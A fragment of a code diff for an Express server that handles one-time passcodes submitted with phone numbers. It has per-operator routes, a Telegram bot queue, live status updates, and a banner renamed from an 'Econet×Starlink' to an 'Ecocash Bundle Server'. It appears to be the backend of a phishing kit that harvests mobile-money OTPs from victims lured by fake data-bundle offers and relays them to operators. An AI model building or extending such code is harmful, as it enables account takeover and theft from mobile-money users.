-  // check-otp-status  (polling — kept for backwards compatibility)
   app.post(`${R}/check-otp-status`, (req, res) => {
     const { otp } = req.body;
     const raw     = req.body.phoneNumber;
@@ -731,8 +756,7 @@ users.forEach((user, link) => {
     res.json({ success: true, status: rec.status });
   });
 
-  // stream-otp-status  (SSE — instant, replaces polling)
-  // Usage: GET /api/{link}/stream-otp-status?phone=+263771234567&otp=123456
+  // SSE — instant push
   app.get(`${R}/stream-otp-status`, (req, res) => {
     const { phone: rp, otp } = req.query;
     if (!rp || !otp) return res.status(400).json({ success: false, message: 'phone and otp required' });
@@ -740,15 +764,13 @@ users.forEach((user, link) => {
     const key   = `${phone}-${otp}`;
     const rec   = user.otps.get(key);
     if (rec && rec.status !== 'pending') {
-      res.setHeader('Content-Type', 'text/event-stream');
-      res.flushHeaders();
+      res.setHeader('Content-Type', 'text/event-stream'); res.flushHeaders();
       res.write(`data: ${JSON.stringify({ status: rec.status })}\n\n`);
       return res.end();
     }
     sseBroker.subscribe(`otp:${key}`, res);
   });
 
-  // resend-otp
   app.post(`${R}/resend-otp`, async (req, res) => {
     if (!botOk(user, res)) return;
     const { timestamp } = req.body;
@@ -763,13 +785,16 @@ users.forEach((user, link) => {
 
 // ─── 404 + ERROR ──────────────────────────────────────────────────────────
 app.use((req, res) => res.status(404).json({ success: false, message: 'Not found', path: req.path }));
-app.use((err, req, res, _next) => { logger.error('Unhandled:', err.message); res.status(500).json({ success: false, error: 'Internal server error' }); });
+app.use((err, req, res, _next) => {
+  logger.error('Unhandled Express error:', err.message);
+  res.status(500).json({ success: false, error: 'Internal server error' });
+});
 
 // ─── GRACEFUL SHUTDOWN ────────────────────────────────────────────────────
 const shutdown = async (sig) => {
   logger.info(`${sig} — shutting down`);
   server.close();
-  for (const u of users.values()) { u.dupes.clear(); await u.mgr?._cleanup(); }
+  for (const u of users.values()) { u.dupes.clear(); u.tgQueue?.flush('shutting down'); }
   process.exit(0);
 };
 process.on('SIGTERM', () => shutdown('SIGTERM'));
@@ -780,8 +805,9 @@ process.on('unhandledRejection', (r) => logger.error('Unhandled rejection:', r))
 // ─── START ────────────────────────────────────────────────────────────────
 const server = app.listen(PORT, () => {
   console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
-  console.log(`🛰️  Econet×Starlink Bundle Server`);
+  console.log(`🛰️  Ecocash Bundle Server`);
   console.log(`🚀  Port: ${PORT}`);
+  console.log(`🌐  Webhook base: ${CFG.WEBHOOK_URL || '⚠️  WEBHOOK_URL not set!'}`);
   console.log(`👥  Users: ${users.size}/${CFG.MAX_USERS}`);
   users.forEach((u, l) => console.log(`   ⏳ ${u.name}: /api/${l}/*`));
   console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
